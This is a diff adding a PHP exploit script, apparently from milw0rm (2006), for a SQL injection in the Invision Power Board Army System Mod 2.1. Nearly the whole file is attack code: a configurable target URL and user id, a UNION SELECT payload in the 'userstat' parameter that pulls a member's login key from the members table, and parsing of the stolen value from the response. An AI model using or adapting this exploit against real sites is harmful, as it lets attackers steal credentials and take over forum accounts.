@@ -1,0 +1,60 @@
+<?php
+/* --------------------------- EXPLOIT ---------------------------
+Invision Power Board Army System Mod 2.1 SQL Injection Exploit
+Tested on: Latest version (2.1.0)
+Discovered on: 06.02.2006 by Alex & fRoGGz
+Credits to: SecuBox Labs
+
+PLEASE READ THIS !
+The query of the SQL Injection depends about the number of fields in the sql table
+We have successfully tested the exploit on a new fresh IPB 2.1.x with Army 
+System Mod 2.1 installed
+
+IN NO EVENT SHALL THE OWNER OF THIS CODE OR CONTRIBUTORS BE LIABLE 
+FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
+DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
+SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER 
+CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
+OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
+OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+*/
+
+$target = "http://site.com/forums/"; // <--- Where ?
+$prefix = "ibf_"; // <--- SQL prefix ?
+$id = 1; // <--- Who ?
+
+print_r(get_infos($target,$prefix,$id));
+if(!get_infos($target,$prefix,$id)) echo "failed";
+
+function get_infos($target,$prefix,$id) {
+
+    $inject = "index.php?s=&act=army&userstat=0+UNION+SELECT+id,member_login_key,";
+    $inject.= "1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,";
+    $inject.= "1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,NULL,NULL,";
+    $inject.= "NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,";
+    $inject.= "NULL+FROM+".$prefix."members+WHERE+id=";
+
+    $filename = $target . $inject . $id;
+
+    $handle = fopen ($filename, "r");
+        $infos = array();
+
+        if (feof($handle)) { continue 2; }
+        if ( $handle ) {
+                while ( ($buffer = fgets( $handle )) )
+                {
+                        if ( strpos( $buffer, "<td class='pformleft' width=\"35%\">Name</td>") ) {
+                                $infos['md5'] = strip_tags ( fgets( $handle) );
+                break;
+                        }
+                }
+        }
+
+    fclose ($handle);
+
+        if (count($infos) == 1) return $infos;
+        return false;
+}
+?>
+
+# milw0rm.com [2006-02-13]
